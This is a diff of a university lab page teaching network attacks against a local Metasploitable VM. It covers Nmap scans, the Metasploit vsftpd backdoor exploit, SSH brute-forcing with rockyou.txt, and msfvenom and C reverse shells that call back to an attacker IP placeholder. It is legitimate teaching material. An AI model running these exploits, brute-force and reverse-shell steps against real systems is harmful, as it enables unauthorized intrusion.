@@ -1,7 +1,7 @@
 # Lab 1: Network Security
 
 {% hint style="danger" %}
-READ: Any knowledge and techniques presented here are for your learning purposes only. It is **ABSOLUTELY ILLEGAL** to apply the learned knowledge to others without proper consent/permission, and even then, you must check and comply with any regulatory restrictions and laws.&#x20;
+READ: Any knowledge and techniques presented here are for your learning purposes only. It is **ABSOLUTELY ILLEGAL** to apply the learned knowledge to others without proper consent/permission, and even then, you must check and comply with any regulatory restrictions and laws.
 {% endhint %}
 
 The aim of this lab is to introduce you to some useful network exploit concepts and tools commonly used to get familiar with attack styles, as well as practice Linux commands from Lab 0 in the context. In addition, to have a better understanding about the underlying mechanisms of tools, unlike in CITS1003 where we just used tools to observe outcomes.
@@ -27,7 +27,7 @@ If your machine uses an Apple Silicon ARM64, you must do the following tasks to 
 1. Install [brew](https://brew.sh/) if not done already
 2. Install qemu if not done already: `brew install qemu`
 3. Navigate to the directory containing the metasploitable image file you downloaded
-4. Convert image: \
+4. Convert image:\
    `qemu-img convert -p -O qcow2 Metasploitable.vmdk Metasploitable.qcow2`
 5. Open UTM: add new -> Emulate -> Other -> skip ISO
 6. Settings -> remove drive
@@ -45,14 +45,14 @@ This only works on new versions of Bash (which is the case with Kali). If you ar
 
 1. start a netcat listener on terminal 1: `nc -vnlp 4444`
 2. On a different terminal (terminal 2), start a bash session: `bash`
-3. Still on terminal 2, send a message using  the cat command:\
+3. Still on terminal 2, send a message using the cat command:\
    `cat >/dev/tcp/localhost/4444`
 4. From terminal 1, you should see a connection message
 5. You can press `ctrl + C` to end
 
 If you do not see the connection message at step 4, then you need to upgrade your Bash version (or use Kali for simplicity). If you attempt to connect to a closed port, you will simply receive a "Connection refused" message.
 
-So we have a basic understanding of using Bash and open ports from the above example, so now we can create our own port scanner Bash script!&#x20;
+So we have a basic understanding of using Bash and open ports from the above example, so now we can create our own port scanner Bash script!
 
 Download the portscan.sh script:
 
@@ -117,9 +117,9 @@ The underlying principle is the same, the tools we will cover next will have som
 
 Since writing scripts ourselves is inefficient, we now will have a look at a tool named _Nmap_.
 
-Nmap is an open-source tool for network exploration and security auditing. It inspects raw IP packets to find various information about the network and systems, including services (name and version), OS and versions, firewalls, and more. Nmap is useful for system administration (e.g., network inventory, service upgrades, monitoring, etc.), but of course, it is also useful for malicious purposes.&#x20;
+Nmap is an open-source tool for network exploration and security auditing. It inspects raw IP packets to find various information about the network and systems, including services (name and version), OS and versions, firewalls, and more. Nmap is useful for system administration (e.g., network inventory, service upgrades, monitoring, etc.), but of course, it is also useful for malicious purposes.
 
-The first intuitive use of Nmap is to scan the network to find (a potentially vulnerable) host(s). This can be done by scanning the IP range.&#x20;
+The first intuitive use of Nmap is to scan the network to find (a potentially vulnerable) host(s). This can be done by scanning the IP range.
 
 `$ nmap -sn [target IP range]`
 
@@ -129,11 +129,11 @@ e.g.,
 nmap -sn 192.168.64.0/24
 ```
 
-![](<../.gitbook/assets/image (3) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
 
 Here, the flag `-sn` indicates that it uses ping to check whether the host exists or not. So this is basically a script that runs a ping command to the given network address(es)! There are other flags that could be used, which you can find more from [>>here<<](https://nmap.org/book/man-briefoptions.html).
 
-One of the listed addresses should be your victim machine (metasploitable VM).&#x20;
+One of the listed addresses should be your victim machine (metasploitable VM).
 
 {% hint style="warning" %}
 If you don't see your metasploitable VM in the list, please check your network settings.
@@ -153,7 +153,7 @@ Then we should be able to see something like:
 
 ![](<../.gitbook/assets/image (6) (1) (1) (1).png>)
 
-So we have used Nmap to discover hosts in the network, and also scan them to find services and OS details. Just remember, Nmap is just executing a bunch of scripts like we wrote in the previous section, just automated. So you can always dig through its exploit database and have a look at the details of those attacks (because it is open-source, it is possible).&#x20;
+So we have used Nmap to discover hosts in the network, and also scan them to find services and OS details. Just remember, Nmap is just executing a bunch of scripts like we wrote in the previous section, just automated. So you can always dig through its exploit database and have a look at the details of those attacks (because it is open-source, it is possible).
 
 Now we will move on to gaining access by exploiting some of the vulnerabilities associated with the services we found.
 
@@ -171,7 +171,7 @@ From the nmap scan above, we have discovered the IP address of our target (metas
 
 ### 1.3.1. Exploit FTP
 
-The Nmap scan revealed the version of the FTP on the target machine. If you search for vulnerabilities associated with the given version `vsftpd 2.3.4`, you will quickly discover that there is a backdoor vulnerability (more precisely, [`CVE-2011-2523`](https://www.cvedetails.com/cve/CVE-2011-2523/)). The CVSS Score is 10, indicating that the impact of this vulnerability is severe.&#x20;
+The Nmap scan revealed the version of the FTP on the target machine. If you search for vulnerabilities associated with the given version `vsftpd 2.3.4`, you will quickly discover that there is a backdoor vulnerability (more precisely, [`CVE-2011-2523`](https://www.cvedetails.com/cve/CVE-2011-2523/)). The CVSS Score is 10, indicating that the impact of this vulnerability is severe.
 
 Since it's there, we'll exploit it. Launch the Metasploit from the terminal:
 
@@ -179,7 +179,7 @@ Since it's there, we'll exploit it. Launch the Metasploit from the terminal:
 msfconsole
 ```
 
-![](<../.gitbook/assets/image (5) (1) (1).png>)
+![](<../.gitbook/assets/image (5) (1) (1) (1).png>)
 
 From the msfconsole, we can search for the identified service-related exploits
 
@@ -187,7 +187,7 @@ From the msfconsole, we can search for the identified service-related exploits
 use vsftpd
 ```
 
-![](<../.gitbook/assets/image (4) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)
 
 In fact, there is only one exploit (the backdoor one) available, so it will be automatically be selected. If it is not automatically selected, just type: `use 0` (i.e., the number 0th exploit) to select it.
 
@@ -227,7 +227,7 @@ Now you have a remote shell on your target host! Try navigating, creating files,
 
 This vulnerability came about when someone had uploaded a modified version of `vsftpd` to the master site and some users downloaded this version for their systems (i.e., it came with the backdoor). The backdoor opened port 6200 to give the attacker a command shell.
 
-This showed the importance of authentication and authorisation (don't let anyone upload/update important data) and also the ability to check and approve changes.&#x20;
+This showed the importance of authentication and authorisation (don't let anyone upload/update important data) and also the ability to check and approve changes.
 
 #### Finishing
 
@@ -239,15 +239,15 @@ Okay, so the previous one is highly unlikely given the vulnerable service is mor
 
 We assume we don’t know the credentials to log in to the metasploitable VM, so we must figure out both the username and password to gain access.
 
-From Nmap scans, we know that the SSH service is running on port 22. However, its version is `OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)`. The protocol 1.0 had lots of bugs that could have been exploited easily, but 2.0 is much more secure. So instead, we will attempt a bruteforce attack.&#x20;
+From Nmap scans, we know that the SSH service is running on port 22. However, its version is `OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)`. The protocol 1.0 had lots of bugs that could have been exploited easily, but 2.0 is much more secure. So instead, we will attempt a bruteforce attack.
 
-&#x20;Like before, we begin by searching for `ssh` related exploits in the Metasploit console:
+Like before, we begin by searching for `ssh` related exploits in the Metasploit console:
 
 ```
 search ssh
 ```
 
-![](<../.gitbook/assets/image (4) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1).png>)
 
 ... But there are too many! So let's reduce the selection to `ssh_login`:
 
@@ -264,7 +264,7 @@ use 0
 show options
 ```
 
-![](<../.gitbook/assets/image (3) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1).png>)
 
 Like before, set the `RHOST` to be the target IP address. In addition, we must also provide the wordlist for username and password (you can either provide a single file that contains the pairs in `USERPASS_FILE`, or separately to try all pairs from the two files for `USER_FILE` and `PASS_FILE`). You can also read other option descriptions to change as necessary. For our bruteforce attack, we will use a `USERPASS_FILE` that comes with Metasploit.
 
@@ -274,7 +274,7 @@ set USERPASS_FILE = /usr/share/metasploit-framework/data/wordlists/piata_ssh_use
 
 ![](../.gitbook/assets/image.png)
 
-At this point, we can run the exploit (you can try, but it will take a while because its bruteforce, took me about 15 mins to finish). Since we know the credentials (msfadmin/msfadmin), we can shorten the waiting time by creating a shortened userpass  file from the original file above (i.e., delete bunch of lines but keep the actual credential). Once run, you should eventually get to this:
+At this point, we can run the exploit (you can try, but it will take a while because its bruteforce, took me about 15 mins to finish). Since we know the credentials (msfadmin/msfadmin), we can shorten the waiting time by creating a shortened userpass file from the original file above (i.e., delete bunch of lines but keep the actual credential). Once run, you should eventually get to this:
 
 ![](<../.gitbook/assets/image (1) (1).png>)
 
@@ -296,13 +296,13 @@ The script is basically enumerating through users' RIDs that uniquely identifies
 
 If you scroll down the list, you will find that the user “msfadmin” is the one that is not disabled! So we can use this information back in our `ssh_login` options!
 
-&#x20;We will also use the `rockyou.txt` password wordlist file that contains a lot of commonly used passwords. It comes with Kali at `/usr/share/wordlists`, you just have to extract it:
+We will also use the `rockyou.txt` password wordlist file that contains a lot of commonly used passwords. It comes with Kali at `/usr/share/wordlists`, you just have to extract it:
 
 ```
 sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
 ```
 
-&#x20;Once done, remove the USERPASS file and set USERNAME and PASS\_FILE.
+Once done, remove the USERPASS file and set USERNAME and PASS\_FILE.
 
 ```
 unset USERPASS_FILE
@@ -310,7 +310,7 @@ set PASS_FILE /usr/share/wordlists/rockyou.txt
 set USERNAME msfadmin
 ```
 
-![](<../.gitbook/assets/image (5) (1).png>)
+![](<../.gitbook/assets/image (5) (1) (1).png>)
 
 Now the bruteforce attack only has to guess the password!
 
@@ -326,7 +326,7 @@ The Metasploit also comes with tools to create vulnerable executable scripts/fil
 msfvenom -p python/shell_reverse_tcp LHOST=[attacker IP address] LPORT=[attacker listening port]
 ```
 
-![](<../.gitbook/assets/image (3).png>)
+![](<../.gitbook/assets/image (3) (1).png>)
 
 The payload created is a python executable code, which you can execute from your victim host. You will also notice that `msfvenom` applied code obfuscation techniques so that you cannot directly read the payload to understand exactly what this code is doing.
 
@@ -346,7 +346,7 @@ We set 443 to be the incoming port from the target host, so we listen on this po
 python -c "[copy and paste payload here]"
 ```
 
-![Left, you see the target host terminal. Right, you see the attacker terminal that got the reverse shell!](<../.gitbook/assets/image (4) (1).png>)
+![Left, you see the target host terminal. Right, you see the attacker terminal that got the reverse shell!](<../.gitbook/assets/image (4) (1) (1).png>)
 
 {% hint style="info" %}
 Usually the attacker will place the payload into an executable file (and likely autorun it). Such malicious payload can be created for various types of applications, not just Python (could be PHP, Java, .exe for Windows etc.). Also, there are many ways to hide such payload (masquerading, obfuscations etc.) – still a big issue today!
@@ -364,17 +364,17 @@ First, download the reverse shell files:
 wget https://raw.githubusercontent.com/uwacyber/cits3006/2022s2/cits3006-labs/files/rshell.zip
 ```
 
-![](<../.gitbook/assets/image (4).png>)
+![](<../.gitbook/assets/image (4) (1).png>)
 
 Unzip using the `unzip` command.
 
-Let's test it first, we have to update the attacker's IP address in the `victim.c` (at line 27) code (you can update the port too if you want, but make sure to do it on both files).&#x20;
+Let's test it first, we have to update the attacker's IP address in the `victim.c` (at line 27) code (you can update the port too if you want, but make sure to do it on both files).
 
 Once done, we can now compile the c codes using the makefile provided (if you have binaries in the zip, delete them and recompile).
 
 ![](<../.gitbook/assets/image (1).png>)
 
-We can do this on a single machine, but you can also move the victim code to a different VM (remember to recompile if different architecture).&#x20;
+We can do this on a single machine, but you can also move the victim code to a different VM (remember to recompile if different architecture).
 
 ![For this example, I used two VMs - Kali (hacker) and Ubuntu (victim)](<../.gitbook/assets/image (8).png>)
 
@@ -382,7 +382,7 @@ So it works! Let's have a closer look at the code, starting with the `hacker.c` 
 
 There isn't much to this code really (i.e., typical socket handling in c), the most interesting part is from lines 83 to 105:
 
-![](<../.gitbook/assets/image (5).png>)
+![](<../.gitbook/assets/image (5) (1).png>)
 
 This is where we prepare for command transmission (lines 93 - 96), and send the command (lines 99 - 103). Now let's have a look at the victim's code in `victim.c` file.
 
@@ -390,7 +390,7 @@ This is where we prepare for command transmission (lines 93 - 96), and send the 
 
 Again, nothing much in the code other than typical socket coding for the client, BUT look at lines 61 - 63. This is where the reverse shell happens:
 
-1. the [`dup2` function](https://man7.org/linux/man-pages/man2/dup.2.html) takes two arguments `oldfd` and `newfd`, where the two [file descriptors](https://en.wikipedia.org/wiki/File\_descriptor) (fd) are made equivalent (i.e., you can use either). For example, After `dup2(socket_id, 0)`, whatever file was opened on the descriptor `socket_id` is now also opened (with the same mode and position) on the descriptor `0`, i.e. on standard input.&#x20;
+1. the [`dup2` function](https://man7.org/linux/man-pages/man2/dup.2.html) takes two arguments `oldfd` and `newfd`, where the two [file descriptors](https://en.wikipedia.org/wiki/File\_descriptor) (fd) are made equivalent (i.e., you can use either). For example, After `dup2(socket_id, 0)`, whatever file was opened on the descriptor `socket_id` is now also opened (with the same mode and position) on the descriptor `0`, i.e. on standard input.
 2. This is applied to all other file descriptors 1 and 2 representing the standard output and the standard error, respectively.
 
 This means all the `stdio` are redirected to the socket that is sent to the attacker (bad)!
@@ -406,3 +406,7 @@ However, this code does not have any obfuscation, which means it is very easy to
 In this lab, we covered two useful tools, Nmap and Metasploit. There were additional exercises to better understand how such tools work (port scanner and reverse shell) to provide a deeper understanding of different exploit techniques.
 
 Next up, Vulnerabilities.
+
+{% hint style="info" %}
+PREPARATION: the next lab uses a new VM - Windows 10. The ISO file is HUGE (5.5G), so please download and setup the Windows 10 VM before going to the lab.
+{% endhint %}
